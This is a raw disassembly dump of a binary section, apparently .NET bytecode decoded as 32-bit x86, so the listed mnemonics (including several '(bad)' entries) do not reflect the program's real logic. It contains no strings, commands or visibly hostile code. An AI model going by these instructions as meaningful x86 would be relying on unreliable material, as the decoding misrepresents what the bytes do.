  4042aa:	0a 2d 04 16 0c de    	or     0xde0c1604,%ch
  4042b0:	39 07                	cmp    %eax,(%edi)
  4042b2:	02 7b 4f             	add    0x4f(%ebx),%bh
  4042b5:	00 00                	add    %al,(%eax)
  4042b7:	04 7d                	add    $0x7d,%al
  4042b9:	4b                   	dec    %ebx
  4042ba:	00 00                	add    %al,(%eax)
  4042bc:	04 17                	add    $0x17,%al
  4042be:	0c de                	or     $0xde,%al
  4042c0:	29 de                	sub    %ebx,%esi
  4042c2:	03 26                	add    (%esi),%esp
  4042c4:	de 00                	fiadds (%eax)
  4042c6:	16                   	push   %ss
  4042c7:	0c de                	or     $0xde,%al
  4042c9:	20 13                	and    %dl,(%ebx)
  4042cb:	09 02                	or     %eax,(%edx)
  4042cd:	1f                   	pop    %ds
  4042ce:	fe                   	(bad)
  4042cf:	7d 4c                	jge    0x40431d
  4042d1:	00 00                	add    %al,(%eax)
  4042d3:	04 02                	add    $0x2,%al
  4042d5:	14 7d                	adc    $0x7d,%al
  4042d7:	51                   	push   %ecx
  4042d8:	00 00                	add    %al,(%eax)
  4042da:	04 02                	add    $0x2,%al
  4042dc:	7c 4d                	jl     0x40432b
  4042de:	00 00                	add    %al,(%eax)
  4042e0:	04 11                	add    $0x11,%al
  4042e2:	09 28                	or     %ebp,(%eax)
  4042e4:	7c 00                	jl     0x4042e6
  4042e6:	00 0a                	add    %cl,(%edx)
  4042e8:	de 1b                	ficomps (%ebx)
  4042ea:	02 1f                	add    (%edi),%bl
  4042ec:	fe                   	(bad)
  4042ed:	7d 4c                	jge    0x40433b
  4042ef:	00 00                	add    %al,(%eax)
  4042f1:	04 02                	add    $0x2,%al
  4042f3:	14 7d                	adc    $0x7d,%al
  4042f5:	51                   	push   %ecx
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	04 02                	add    $0x2,%al
  4042fa:	7c 4d                	jl     0x404349
  4042fc:	00 00                	add    %al,(%eax)
  4042fe:	04 08                	add    $0x8,%al
  404300:	28 7d 00             	sub    %bh,0x0(%ebp)
  404303:	00 0a                	add    %cl,(%edx)
  404305:	2a 00                	sub    (%eax),%al
  404307:	00 41 34             	add    %al,0x34(%ecx)
  40430a:	00 00                	add    %al,(%eax)
  40430c:	00 00                	add    %al,(%eax)
  40430e:	00 00                	add    %al,(%eax)
  404310:	2a 00                	sub    (%eax),%al
  404312:	00 00                	add    %al,(%eax)
  404314:	25 03 00 00 4f       	and    $0x4f000003,%eax
  404319:	03 00                	add    (%eax),%eax
  40431b:	00 03                	add    %al,(%ebx)
  40431d:	00 00                	add    %al,(%eax)
  40431f:	00 01                	add    %al,(%ecx)
  404321:	00 00                	add    %al,(%eax)
  404323:	01 00                	add    %eax,(%eax)
  404325:	00 00                	add    %al,(%eax)
  404327:	00 0e                	add    %cl,(%esi)
  404329:	00 00                	add    %al,(%eax)
  40432b:	00 48 03             	add    %cl,0x3(%eax)
  40432e:	00 00                	add    %al,(%eax)
  404330:	56                   	push   %esi
  404331:	03 00                	add    (%eax),%eax
  404333:	00 20                	add    %ah,(%eax)
  404335:	00 00                	add    %al,(%eax)
  404337:	00 0b                	add    %cl,(%ebx)
  404339:	00 00                	add    %al,(%eax)
  40433b:	01 1b                	add    %ebx,(%ebx)
  40433d:	30 05 00 d1 02 00    	xor    %al,0x2d100
  404343:	00 1c 00             	add    %bl,(%eax,%eax,1)
  404346:	00 11                	add    %dl,(%ecx)
  404348:	02 7b 54             	add    0x54(%ebx),%bh
  40434b:	00 00                	add    %al,(%eax)
  40434d:	04 0a                	add    $0xa,%al
  40434f:	02 7b 56             	add    0x56(%ebx),%bh
  404352:	00 00                	add    %al,(%eax)
  404354:	04 0b                	add    $0xb,%al
  404356:	06                   	push   %es
  404357:	19 36                	sbb    %esi,(%esi)
  404359:	09 06                	or     %eax,(%esi)
  40435b:	1a 3b                	sbb    (%ebx),%bh
  40435d:	5f                   	pop    %edi
  40435e:	02 00                	add    (%eax),%al
  404360:	00 16                	add    %dl,(%esi)
  404362:	0d 00 06 45 04       	or     $0x4450600,%eax
  404367:	00 00                	add    %al,(%eax)
  404369:	00 5d 00             	add    %bl,0x0(%ebp)
  40436c:	00 00                	add    %al,(%eax)
  40436e:	dd 00                	fldl   (%eax)
  404370:	00 00                	add    %al,(%eax)
  404372:	5e                   	pop    %esi
  404373:	01 00                	add    %eax,(%eax)
  404375:	00 cb                	add    %cl,%bl
  404377:	01 00                	add    %eax,(%eax)
  404379:	00 02                	add    %al,(%edx)
  40437b:	18 17                	sbb    %dl,(%edi)
  40437d:	1c 73                	sbb    $0x73,%al
  40437f:	7f 00                	jg     0x404381
  404381:	00 0a                	add    %cl,(%edx)
  404383:	7d 5a                	jge    0x4043df
  404385:	00 00                	add    %al,(%eax)
  404387:	04 02                	add    $0x2,%al
  404389:	7b 5a                	jnp    0x4043e5
  40438b:	00 00                	add    %al,(%eax)
  40438d:	04 07                	add    $0x7,%al
  40438f:	7b 47                	jnp    0x4043d8
  404391:	00 00                	add    %al,(%eax)
  404393:	04 7b                	add    $0x7b,%al
  404395:	6f                   	outsl  %ds:(%esi),(%dx)
  404396:	00 00                	add    %al,(%eax)
  404398:	04 6f                	add    $0x6f,%al
  40439a:	80 00 00             	addb   $0x0,(%eax)
  40439d:	0a 28                	or     (%eax),%ch
  40439f:	81 00 00 0a 6f 37    	addl   $0x376f0a00,(%eax)
  4043a5:	00 00                	add    %al,(%eax)
  4043a7:	0a 13                	or     (%ebx),%dl
  4043a9:	06                   	push   %es
  4043aa:	12 06                	adc    (%esi),%al
  4043ac:	28 38                	sub    %bh,(%eax)
  4043ae:	00 00                	add    %al,(%eax)
  4043b0:	0a 2d 41 02 16 25    	or     0x25160241,%ch
  4043b6:	0a 7d 54             	or     0x54(%ebp),%bh
  4043b9:	00 00                	add    %al,(%eax)
  4043bb:	04 02                	add    $0x2,%al
  4043bd:	11 06                	adc    %eax,(%esi)
  4043bf:	7d 5c                	jge    0x40441d
  4043c1:	00 00                	add    %al,(%eax)
  4043c3:	04 02                	add    $0x2,%al
  4043c5:	7c 55                	jl     0x40441c
  4043c7:	00 00                	add    %al,(%eax)
  4043c9:	04 12                	add    $0x12,%al
  4043cb:	06                   	push   %es
  4043cc:	02 28                	add    (%eax),%ch
  4043ce:	27                   	daa
  4043cf:	00 00                	add    %al,(%eax)
  4043d1:	2b dd                	sub    %ebp,%ebx
  4043d3:	41                   	inc    %ecx
  4043d4:	02 00                	add    (%eax),%al
  4043d6:	00 02                	add    %al,(%edx)
  4043d8:	7b 5c                	jnp    0x404436
  4043da:	00 00                	add    %al,(%eax)
  4043dc:	04 13                	add    $0x13,%al
  4043de:	06                   	push   %es
  4043df:	02 7c 5c 00          	add    0x0(%esp,%ebx,2),%bh
  4043e3:	00 04 fe             	add    %al,(%esi,%edi,8)
  4043e6:	15 0a 00 00 01       	adc    $0x100000a,%eax
  4043eb:	02 15 25 0a 7d 54    	add    0x547d0a25,%dl
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	04 12                	add    $0x12,%al
  4043f5:	06                   	push   %es
  4043f6:	28 39                	sub    %bh,(%ecx)
  4043f8:	00 00                	add    %al,(%eax)
  4043fa:	0a 02                	or     (%edx),%al
  4043fc:	7b 5a                	jnp    0x404458
  4043fe:	00 00                	add    %al,(%eax)
  404400:	04 07                	add    $0x7,%al
  404402:	7b 47                	jnp    0x40444b
  404404:	00 00                	add    %al,(%eax)
  404406:	04 7b                	add    $0x7b,%al
  404408:	70 00                	jo     0x40440a
  40440a:	00 04 02             	add    %al,(%edx,%eax,1)
  40440d:	7b 57                	jnp    0x404466
  40440f:	00 00                	add    %al,(%eax)
  404411:	04 07                	add    $0x7,%al
  404413:	7b 49                	jnp    0x40445e
  404415:	00 00                	add    %al,(%eax)
  404417:	04 02                	add    $0x2,%al
  404419:	7b 58                	jnp    0x404473
  40441b:	00 00                	add    %al,(%eax)
  40441d:	04 28                	add    $0x28,%al
  40441f:	75 00                	jne    0x404421
  404421:	00 06                	add    %al,(%esi)
  404423:	6f                   	outsl  %ds:(%esi),(%dx)
  404424:	4e                   	dec    %esi
  404425:	00 00                	add    %al,(%eax)
  404427:	0a 13                	or     (%ebx),%dl
  404429:	08 12                	or     %dl,(%edx)
  40442b:	08 28                	or     %ch,(%eax)
  40442d:	4f                   	dec    %edi
  40442e:	00 00                	add    %al,(%eax)
  404430:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  404436:	0a 7d 54             	or     0x54(%ebp),%bh
  404439:	00 00                	add    %al,(%eax)
  40443b:	04 02                	add    $0x2,%al
  40443d:	11 08                	adc    %ecx,(%eax)
  40443f:	7d 5d                	jge    0x40449e
  404441:	00 00                	add    %al,(%eax)
  404443:	04 02                	add    $0x2,%al
  404445:	7c 55                	jl     0x40449c
  404447:	00 00                	add    %al,(%eax)
  404449:	04 12                	add    $0x12,%al
  40444b:	08 02                	or     %al,(%edx)
  40444d:	28 28                	sub    %ch,(%eax)
  40444f:	00 00                	add    %al,(%eax)
  404451:	2b dd                	sub    %ebp,%ebx
  404453:	c1 01 00             	roll   $0x0,(%ecx)
  404456:	00 02                	add    %al,(%edx)
  404458:	7b 5d                	jnp    0x4044b7
  40445a:	00 00                	add    %al,(%eax)
  40445c:	04 13                	add    $0x13,%al
  40445e:	08 02                	or     %al,(%edx)
  404460:	7c 5d                	jl     0x4044bf
  404462:	00 00                	add    %al,(%eax)
  404464:	04 fe                	add    $0xfe,%al
  404466:	15 08 00 00 1b       	adc    $0x1b000008,%eax
  40446b:	02 15 25 0a 7d 54    	add    0x547d0a25,%dl
  404471:	00 00                	add    %al,(%eax)
  404473:	04 12                	add    $0x12,%al
  404475:	08 28                	or     %ch,(%eax)
  404477:	50                   	push   %eax
  404478:	00 00                	add    %al,(%eax)
  40447a:	0a 13                	or     (%ebx),%dl
  40447c:	07                   	pop    %es
  40447d:	02 11                	add    (%ecx),%dl
  40447f:	07                   	pop    %es
  404480:	7d 5b                	jge    0x4044dd
  404482:	00 00                	add    %al,(%eax)
  404484:	04 17                	add    $0x17,%al
  404486:	8d 2e                	lea    (%esi),%ebp
  404488:	00 00                	add    %al,(%eax)
  40448a:	01 25 16 02 7b 59    	add    %esp,0x597b0216
  404490:	00 00                	add    %al,(%eax)
  404492:	04 d2                	add    $0xd2,%al
  404494:	9c                   	pushf
  404495:	13 04 02             	adc    (%edx,%eax,1),%eax
  404498:	7b 5b                	jnp    0x4044f5
  40449a:	00 00                	add    %al,(%eax)
  40449c:	04 11                	add    $0x11,%al
  40449e:	04 6f                	add    $0x6f,%al
  4044a0:	32 00                	xor    (%eax),%al
  4044a2:	00 06                	add    %al,(%esi)
  4044a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044a5:	2b 00                	sub    (%eax),%eax
  4044a7:	00 0a                	add    %cl,(%edx)
  4044a9:	13 09                	adc    (%ecx),%ecx
  4044ab:	12 09                	adc    (%ecx),%cl
  4044ad:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4044b0:	00 0a                	add    %cl,(%edx)
  4044b2:	2d 41 02 18 25       	sub    $0x25180241,%eax
  4044b7:	0a 7d 54             	or     0x54(%ebp),%bh
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	04 02                	add    $0x2,%al
  4044be:	11 09                	adc    %ecx,(%ecx)
  4044c0:	7d 5e                	jge    0x404520
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	04 02                	add    $0x2,%al
  4044c6:	7c 55                	jl     0x40451d
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	04 12                	add    $0x12,%al
  4044cc:	09 02                	or     %eax,(%edx)
  4044ce:	28 29                	sub    %ch,(%ecx)
  4044d0:	00 00                	add    %al,(%eax)
  4044d2:	2b dd                	sub    %ebp,%ebx
  4044d4:	40                   	inc    %eax
  4044d5:	01 00                	add    %eax,(%eax)
  4044d7:	00 02                	add    %al,(%edx)
  4044d9:	7b 5e                	jnp    0x404539
  4044db:	00 00                	add    %al,(%eax)
  4044dd:	04 13                	add    $0x13,%al
  4044df:	09 02                	or     %eax,(%edx)
  4044e1:	7c 5e                	jl     0x404541
  4044e3:	00 00                	add    %al,(%eax)
  4044e5:	04 fe                	add    $0xfe,%al
  4044e7:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  4044ec:	02 15 25 0a 7d 54    	add    0x547d0a25,%dl
  4044f2:	00 00                	add    %al,(%eax)
  4044f4:	04 12                	add    $0x12,%al
  4044f6:	09 28                	or     %ebp,(%eax)
  4044f8:	2d 00 00 0a 26       	sub    $0x260a0000,%eax
  4044fd:	17                   	pop    %ss
  4044fe:	8d 2e                	lea    (%esi),%ebp
  404500:	00 00                	add    %al,(%eax)
  404502:	01 25 16 17 9c 13    	add    %esp,0x139c1716
  404508:	05 07 11 05 28       	add    $0x28051107,%eax
  40450d:	32 00                	xor    (%eax),%al
  40450f:	00 06                	add    %al,(%esi)
  404511:	6f                   	outsl  %ds:(%esi),(%dx)
  404512:	2b 00                	sub    (%eax),%eax
  404514:	00 0a                	add    %cl,(%edx)
  404516:	13 09                	adc    (%ecx),%ecx
  404518:	12 09                	adc    (%ecx),%cl
  40451a:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  40451d:	00 0a                	add    %cl,(%edx)
  40451f:	2d 41 02 19 25       	sub    $0x25190241,%eax
  404524:	0a 7d 54             	or     0x54(%ebp),%bh
  404527:	00 00                	add    %al,(%eax)
  404529:	04 02                	add    $0x2,%al
  40452b:	11 09                	adc    %ecx,(%ecx)
  40452d:	7d 5e                	jge    0x40458d
  40452f:	00 00                	add    %al,(%eax)
  404531:	04 02                	add    $0x2,%al
  404533:	7c 55                	jl     0x40458a
  404535:	00 00                	add    %al,(%eax)
  404537:	04 12                	add    $0x12,%al
  404539:	09 02                	or     %eax,(%edx)
  40453b:	28 29                	sub    %ch,(%ecx)
  40453d:	00 00                	add    %al,(%eax)
  40453f:	2b dd                	sub    %ebp,%ebx
  404541:	d3 00                	roll   %cl,(%eax)
  404543:	00 00                	add    %al,(%eax)
  404545:	02 7b 5e             	add    0x5e(%ebx),%bh
  404548:	00 00                	add    %al,(%eax)
  40454a:	04 13                	add    $0x13,%al
  40454c:	09 02                	or     %eax,(%edx)
  40454e:	7c 5e                	jl     0x4045ae
  404550:	00 00                	add    %al,(%eax)
  404552:	04 fe                	add    $0xfe,%al
  404554:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  404559:	02 15 25 0a 7d 54    	add    0x547d0a25,%dl
  40455f:	00 00                	add    %al,(%eax)
  404561:	04 12                	add    $0x12,%al
  404563:	09 28                	or     %ebp,(%eax)
  404565:	2d 00 00 0a 26       	sub    $0x260a0000,%eax
  40456a:	02 7b 5b             	add    0x5b(%ebx),%bh
  40456d:	00 00                	add    %al,(%eax)
  40456f:	04 0c                	add    $0xc,%al
  404571:	dd 8e 00 00 00 26    	fisttpll 0x26000000(%esi)
  404577:	17                   	pop    %ss
  404578:	0d de 00 09 17       	or     $0x170900de,%eax
  40457d:	33 6a 17             	xor    0x17(%edx),%ebp
  404580:	8d 2e                	lea    (%esi),%ebp
  404582:	00 00                	add    %al,(%eax)
  404584:	01 13                	add    %edx,(%ebx)
  404586:	0a 07                	or     (%edi),%al
  404588:	11 0a                	adc    %ecx,(%edx)
  40458a:	28 32                	sub    %dh,(%edx)
  40458c:	00 00                	add    %al,(%eax)
  40458e:	06                   	push   %es
  40458f:	6f                   	outsl  %ds:(%esi),(%dx)
  404590:	2b 00                	sub    (%eax),%eax
  404592:	00 0a                	add    %cl,(%edx)
  404594:	13 09                	adc    (%ecx),%ecx
  404596:	12 09                	adc    (%ecx),%cl
  404598:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  40459b:	00 0a                	add    %cl,(%edx)
  40459d:	2d 3e 02 1a 25       	sub    $0x251a023e,%eax
  4045a2:	0a 7d 54             	or     0x54(%ebp),%bh
  4045a5:	00 00                	add    %al,(%eax)
  4045a7:	04 02                	add    $0x2,%al
  4045a9:	11 09                	adc    %ecx,(%ecx)
  4045ab:	7d 5e                	jge    0x40460b
  4045ad:	00 00                	add    %al,(%eax)
  4045af:	04 02                	add    $0x2,%al
  4045b1:	7c 55                	jl     0x404608
  4045b3:	00 00                	add    %al,(%eax)
  4045b5:	04 12                	add    $0x12,%al
  4045b7:	09 02                	or     %eax,(%edx)
  4045b9:	28 29                	sub    %ch,(%ecx)
  4045bb:	00 00                	add    %al,(%eax)
  4045bd:	2b de                	sub    %esi,%ebx
  4045bf:	58                   	pop    %eax
  4045c0:	02 7b 5e             	add    0x5e(%ebx),%bh
  4045c3:	00 00                	add    %al,(%eax)
  4045c5:	04 13                	add    $0x13,%al
  4045c7:	09 02                	or     %eax,(%edx)
  4045c9:	7c 5e                	jl     0x404629
  4045cb:	00 00                	add    %al,(%eax)
  4045cd:	04 fe                	add    $0xfe,%al
  4045cf:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  4045d4:	02 15 25 0a 7d 54    	add    0x547d0a25,%dl
  4045da:	00 00                	add    %al,(%eax)
  4045dc:	04 12                	add    $0x12,%al
  4045de:	09 28                	or     %ebp,(%eax)
  4045e0:	2d 00 00 0a 26       	sub    $0x260a0000,%eax
  4045e5:	14 0c                	adc    $0xc,%al
  4045e7:	de 1b                	ficomps (%ebx)
  4045e9:	14 7a                	adc    $0x7a,%al
  4045eb:	13 0b                	adc    (%ebx),%ecx
  4045ed:	02 1f                	add    (%edi),%bl
  4045ef:	fe                   	(bad)
  4045f0:	7d 54                	jge    0x404646
  4045f2:	00 00                	add    %al,(%eax)
  4045f4:	04 02                	add    $0x2,%al
  4045f6:	7c 55                	jl     0x40464d
  4045f8:	00 00                	add    %al,(%eax)
  4045fa:	04 11                	add    $0x11,%al
  4045fc:	0b 28                	or     (%eax),%ebp
  4045fe:	83 00 00             	addl   $0x0,(%eax)
  404601:	0a de                	or     %dh,%bl
  404603:	14 02                	adc    $0x2,%al
  404605:	1f                   	pop    %ds
  404606:	fe                   	(bad)
  404607:	7d 54                	jge    0x40465d
  404609:	00 00                	add    %al,(%eax)
  40460b:	04 02                	add    $0x2,%al
  40460d:	7c 55                	jl     0x404664
  40460f:	00 00                	add    %al,(%eax)
  404611:	04 08                	add    $0x8,%al
  404613:	28 84 00 00 0a 2a 00 	sub    %al,0x2a0a00(%eax,%eax,1)
  40461a:	00 00                	add    %al,(%eax)
  40461c:	41                   	inc    %ecx
  40461d:	34 00                	xor    $0x0,%al
  40461f:	00 00                	add    %al,(%eax)
  404621:	00 00                	add    %al,(%eax)
  404623:	00 1c 00             	add    %bl,(%eax,%eax,1)
  404626:	00 00                	add    %al,(%eax)
  404628:	12 02                	adc    (%edx),%al
  40462a:	00 00                	add    %al,(%eax)
  40462c:	2e 02 00             	add    %cs:(%eax),%al
  40462f:	00 05 00 00 00 01    	add    %al,0x1000000
  404635:	00 00                	add    %al,(%eax)
  404637:	01 00                	add    %eax,(%eax)
  404639:	00 00                	add    %al,(%eax)
  40463b:	00 0e                	add    %cl,(%esi)
  40463d:	00 00                	add    %al,(%eax)
  40463f:	00 95 02 00 00 a3    	add    %dl,-0x5cfffffe(%ebp)
  404645:	02 00                	add    (%eax),%al
  404647:	00 19                	add    %bl,(%ecx)
  404649:	00 00                	add    %al,(%eax)
  40464b:	00 0b                	add    %cl,(%ebx)
  40464d:	00 00                	add    %al,(%eax)
  40464f:	01 1b                	add    %ebx,(%ebx)
  404651:	30 05 00 7c 01 00    	xor    %al,0x17c00
  404657:	00 1d 00 00 11 02    	add    %bl,0x2110000
  40465d:	7b 5f                	jnp    0x4046be
  40465f:	00 00                	add    %al,(%eax)
  404661:	04 0a                	add    $0xa,%al
  404663:	02 7b 61             	add    0x61(%ebx),%bh
  404666:	00 00                	add    %al,(%eax)
  404668:	04 0b                	add    $0xb,%al
  40466a:	06                   	push   %es
  40466b:	26 00 06             	add    %al,%es:(%esi)
  40466e:	2c 7a                	sub    $0x7a,%al
  404670:	07                   	pop    %es
  404671:	7b 47                	jnp    0x4046ba
  404673:	00 00                	add    %al,(%eax)
  404675:	04 7b                	add    $0x7b,%al
  404677:	6f                   	outsl  %ds:(%esi),(%dx)
  404678:	00 00                	add    %al,(%eax)
  40467a:	04 39                	add    $0x39,%al
  40467c:	8d 00                	lea    (%eax),%eax
  40467e:	00 00                	add    %al,(%eax)
  404680:	28 86 00 00 0a 07    	sub    %al,0x70a0000(%esi)
  404686:	7b 47                	jnp    0x4046cf
  404688:	00 00                	add    %al,(%eax)
  40468a:	04 7b                	add    $0x7b,%al
  40468c:	6f                   	outsl  %ds:(%esi),(%dx)
  40468d:	00 00                	add    %al,(%eax)
  40468f:	04 fe                	add    $0xfe,%al
  404691:	06                   	push   %es
  404692:	87 00                	xchg   %eax,(%eax)
  404694:	00 0a                	add    %cl,(%edx)
  404696:	73 88                	jae    0x404620
  404698:	00 00                	add    %al,(%eax)
  40469a:	0a 07                	or     (%edi),%al
  40469c:	7b 47                	jnp    0x4046e5
  40469e:	00 00                	add    %al,(%eax)
  4046a0:	04 7b                	add    $0x7b,%al
  4046a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4046a3:	00 00                	add    %al,(%eax)
  4046a5:	04 fe                	add    $0xfe,%al
  4046a7:	06                   	push   %es
  4046a8:	89 00                	mov    %eax,(%eax)
  4046aa:	00 0a                	add    %cl,(%edx)
  4046ac:	73 8a                	jae    0x404638
  4046ae:	00 00                	add    %al,(%eax)
  4046b0:	0a 17                	or     (%edi),%dl
  4046b2:	14 6f                	adc    $0x6f,%al
  4046b4:	2a 00                	sub    (%eax),%al
  4046b6:	00 2b                	add    %ch,(%ebx)
  4046b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b9:	37                   	aaa
  4046ba:	00 00                	add    %al,(%eax)
  4046bc:	0a 0d 12 03 28 38    	or     0x38280312,%cl
  4046c2:	00 00                	add    %al,(%eax)
  4046c4:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  4046ca:	0a 7d 5f             	or     0x5f(%ebp),%bh
  4046cd:	00 00                	add    %al,(%eax)
  4046cf:	04 02                	add    $0x2,%al
  4046d1:	09 7d 62             	or     %edi,0x62(%ebp)
  4046d4:	00 00                	add    %al,(%eax)
  4046d6:	04 02                	add    $0x2,%al
  4046d8:	7c 60                	jl     0x40473a
  4046da:	00 00                	add    %al,(%eax)
  4046dc:	04 12                	add    $0x12,%al
  4046de:	03 02                	add    (%edx),%eax
  4046e0:	28 2b                	sub    %ch,(%ebx)
  4046e2:	00 00                	add    %al,(%eax)
  4046e4:	2b dd                	sub    %ebp,%ebx
  4046e6:	ed                   	in     (%dx),%eax
  4046e7:	00 00                	add    %al,(%eax)
  4046e9:	00 02                	add    %al,(%edx)
  4046eb:	7b 62                	jnp    0x40474f
  4046ed:	00 00                	add    %al,(%eax)
  4046ef:	04 0d                	add    $0xd,%al
  4046f1:	02 7c 62 00          	add    0x0(%edx,%eiz,2),%bh
  4046f5:	00 04 fe             	add    %al,(%esi,%edi,8)
  4046f8:	15 0a 00 00 01       	adc    $0x100000a,%eax
  4046fd:	02 15 25 0a 7d 5f    	add    0x5f7d0a25,%dl
  404703:	00 00                	add    %al,(%eax)
  404705:	04 12                	add    $0x12,%al
  404707:	03 28                	add    (%eax),%ebp
  404709:	39 00                	cmp    %eax,(%eax)
  40470b:	00 0a                	add    %cl,(%edx)
  40470d:	de 1a                	ficomps (%edx)
  40470f:	26 07                	es pop %es
  404711:	7b 47                	jnp    0x40475a
  404713:	00 00                	add    %al,(%eax)
  404715:	04 7b                	add    $0x7b,%al
  404717:	6f                   	outsl  %ds:(%esi),(%dx)
  404718:	00 00                	add    %al,(%eax)
  40471a:	04 25                	add    $0x25,%al
  40471c:	2d 03 26 2b 06       	sub    $0x62b2603,%eax
  404721:	16                   	push   %ss
  404722:	28 8d 00 00 0a de    	sub    %cl,-0x21f60000(%ebp)
  404728:	00 07                	add    %al,(%edi)
  40472a:	7b 47                	jnp    0x404773
  40472c:	00 00                	add    %al,(%eax)
  40472e:	04 7b                	add    $0x7b,%al
  404730:	6f                   	outsl  %ds:(%esi),(%dx)
  404731:	00 00                	add    %al,(%eax)
  404733:	04 25                	add    $0x25,%al
  404735:	2d 03 26 2b 05       	sub    $0x52b2603,%eax
  40473a:	28 8e 00 00 0a 07    	sub    %cl,0x70a0000(%esi)
  404740:	7b 46                	jnp    0x404788
  404742:	00 00                	add    %al,(%eax)
  404744:	04 28                	add    $0x28,%al
  404746:	2c 00                	sub    $0x0,%al
  404748:	00 2b                	add    %ch,(%ebx)
  40474a:	0c 07                	or     $0x7,%al
  40474c:	7b 46                	jnp    0x404794
  40474e:	00 00                	add    %al,(%eax)
  404750:	04 6f                	add    $0x6f,%al
  404752:	90                   	nop
  404753:	00 00                	add    %al,(%eax)
  404755:	0a 08                	or     (%eax),%cl
  404757:	6f                   	outsl  %ds:(%esi),(%dx)
  404758:	91                   	xchg   %eax,%ecx
  404759:	00 00                	add    %al,(%eax)
  40475b:	0a 13                	or     (%ebx),%dl
  40475d:	04 2b                	add    $0x2b,%al
  40475f:	12 12                	adc    (%edx),%dl
  404761:	04 28                	add    $0x28,%al
  404763:	92                   	xchg   %eax,%edx
  404764:	00 00                	add    %al,(%eax)
  404766:	0a 25 2d 03 26 2b    	or     0x2b26032d,%ah
  40476c:	05 28 2e 00 00       	add    $0x2e28,%eax
  404771:	06                   	push   %es
  404772:	12 04 28             	adc    (%eax,%ebp,1),%al
  404775:	93                   	xchg   %eax,%ebx
  404776:	00 00                	add    %al,(%eax)
  404778:	0a 2d e5 de 12 06    	or     0x612dee5,%ch
  40477e:	16                   	push   %ss
  40477f:	2f                   	das
  404780:	0d 12 04 fe 16       	or     $0x16fe0412,%eax
  404785:	13 00                	adc    (%eax),%eax
  404787:	00 1b                	add    %bl,(%ebx)
  404789:	6f                   	outsl  %ds:(%esi),(%dx)
  40478a:	4b                   	dec    %ebx
  40478b:	00 00                	add    %al,(%eax)
  40478d:	0a dc                	or     %ah,%bl
  40478f:	08 6f 90             	or     %ch,-0x70(%edi)
  404792:	00 00                	add    %al,(%eax)
  404794:	0a 07                	or     (%edi),%al
  404796:	7b 45                	jnp    0x4047dd
  404798:	00 00                	add    %al,(%eax)
  40479a:	04 2c                	add    $0x2c,%al
  40479c:	0c 07                	or     $0x7,%al
  40479e:	7b 45                	jnp    0x4047e5
  4047a0:	00 00                	add    %al,(%eax)
  4047a2:	04 07                	add    $0x7,%al
  4047a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a5:	94                   	xchg   %eax,%esp
  4047a6:	00 00                	add    %al,(%eax)
  4047a8:	0a de                	or     %dh,%bl
  4047aa:	19 13                	sbb    %edx,(%ebx)
  4047ac:	05 02 1f fe 7d       	add    $0x7dfe1f02,%eax
  4047b1:	5f                   	pop    %edi
  4047b2:	00 00                	add    %al,(%eax)
  4047b4:	04 02                	add    $0x2,%al
  4047b6:	7c 60                	jl     0x404818
  4047b8:	00 00                	add    %al,(%eax)
  4047ba:	04 11                	add    $0x11,%al
  4047bc:	05 28 95 00 00       	add    $0x9528,%eax
  4047c1:	0a de                	or     %dh,%bl
  4047c3:	13 02                	adc    (%edx),%eax
  4047c5:	1f                   	pop    %ds
  4047c6:	fe                   	(bad)
  4047c7:	7d 5f                	jge    0x404828
  4047c9:	00 00                	add    %al,(%eax)
  4047cb:	04 02                	add    $0x2,%al
  4047cd:	7c 60                	jl     0x40482f
  4047cf:	00 00                	add    %al,(%eax)
  4047d1:	04 28                	add    $0x28,%al
  4047d3:	96                   	xchg   %eax,%esi
  4047d4:	00 00                	add    %al,(%eax)
  4047d6:	0a 2a                	or     (%edx),%ch
  4047d8:	41                   	inc    %ecx
  4047d9:	4c                   	dec    %esp
  4047da:	00 00                	add    %al,(%eax)
  4047dc:	00 00                	add    %al,(%eax)
  4047de:	00 00                	add    %al,(%eax)
  4047e0:	11 00                	adc    %eax,(%eax)
  4047e2:	00 00                	add    %al,(%eax)
  4047e4:	a2 00 00 00 b3       	mov    %al,0xb3000000
  4047e9:	00 00                	add    %al,(%eax)
  4047eb:	00 1a                	add    %bl,(%edx)
  4047ed:	00 00                	add    %al,(%eax)
  4047ef:	00 01                	add    %al,(%ecx)
  4047f1:	00 00                	add    %al,(%eax)
  4047f3:	01 02                	add    %eax,(%edx)
  4047f5:	00 00                	add    %al,(%eax)
  4047f7:	00 02                	add    %al,(%edx)
  4047f9:	01 00                	add    %eax,(%eax)
  4047fb:	00 1f                	add    %bl,(%edi)
  4047fd:	00 00                	add    %al,(%eax)
  4047ff:	00 21                	add    %ah,(%ecx)
  404801:	01 00                	add    %eax,(%eax)
  404803:	00 12                	add    %dl,(%edx)
	...
  40480d:	00 00                	add    %al,(%eax)
  40480f:	00 0e                	add    %cl,(%esi)
  404811:	00 00                	add    %al,(%eax)
  404813:	00 41 01             	add    %al,0x1(%ecx)
  404816:	00 00                	add    %al,(%eax)
  404818:	4f                   	dec    %edi
  404819:	01 00                	add    %eax,(%eax)
  40481b:	00 19                	add    %bl,(%ecx)
  40481d:	00 00                	add    %al,(%eax)
  40481f:	00 0b                	add    %cl,(%ebx)
  404821:	00 00                	add    %al,(%eax)
  404823:	01 1b                	add    %ebx,(%ebx)
  404825:	30 03                	xor    %al,(%ebx)
  404827:	00 b1 00 00 00 1e    	add    %dh,0x1e000000(%ecx)
  40482d:	00 00                	add    %al,(%eax)
  40482f:	11 02                	adc    %eax,(%edx)
  404831:	7b 63                	jnp    0x404896
  404833:	00 00                	add    %al,(%eax)
  404835:	04 0a                	add    $0xa,%al
  404837:	02 7b 65             	add    0x65(%ebx),%bh
  40483a:	00 00                	add    %al,(%eax)
  40483c:	04 0b                	add    $0xb,%al
  40483e:	06                   	push   %es
